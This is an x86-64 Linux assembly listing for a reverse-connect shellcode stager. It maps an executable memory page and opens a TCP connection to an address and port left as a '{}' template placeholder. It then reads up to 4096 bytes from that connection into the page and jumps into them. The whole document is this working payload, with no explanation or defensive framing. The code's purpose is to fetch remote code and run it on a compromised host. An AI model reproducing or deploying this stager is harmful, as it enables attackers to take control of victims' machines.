start:
    xor rdi, rdi
    push 0x9
    pop rax
    cdq
    mov dh, 0x10
    mov rsi, rdx
    xor r9, r9
    push 0x22
    pop r10
    mov dl, 0x7
    syscall

    test rax, rax
    js fail

    push rsi
    push rax
    push 0x29
    pop rax
    cdq
    push 0x2
    pop rdi
    push 0x1
    pop rsi
    syscall

    test rax, rax
    js fail

    xchg rdi, rax
    movabs rcx, 0x{}0002
    push rcx
    mov rsi, rsp
    push 0x10
    pop rdx
    push 0x2a
    pop rax
    syscall

    test rax, rax
    js fail

    pop rcx
    pop rsi
    pop rdx
    syscall

    jmp rsi
    test rax, rax
    js fail

fail:
    push 0x3c
    pop rax
    push 0x1
    pop rdi
    syscall
